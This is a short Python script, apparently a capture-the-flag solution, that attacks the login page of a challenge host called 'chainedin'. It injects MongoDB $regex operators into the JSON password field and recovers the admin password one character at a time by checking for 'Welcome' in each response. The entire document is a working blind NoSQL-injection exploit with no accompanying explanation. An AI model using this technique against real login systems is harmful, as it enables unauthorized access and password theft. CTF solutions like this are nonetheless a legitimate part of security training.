import requests
from sys import stdout

url = "http://chainedin.vuln.icec.tf/login"
pwd = ""
blacklist = [46,42,43,63,124]
while(True):
    cont =False
    for i in range (32,128):
        if i in blacklist:
            continue
        data={'user': 'admin','pass': {'$regex': '^'+pwd+chr(i)+''}}
        r = requests.post(url, json= data)
        if 'Welcome' in r.text:
            if i== 36:
                break
            else:
                pwd += chr(i)
                stdout.write(chr(i))
                stdout.flush()
                cont = True
                break
    if cont == False:
        break

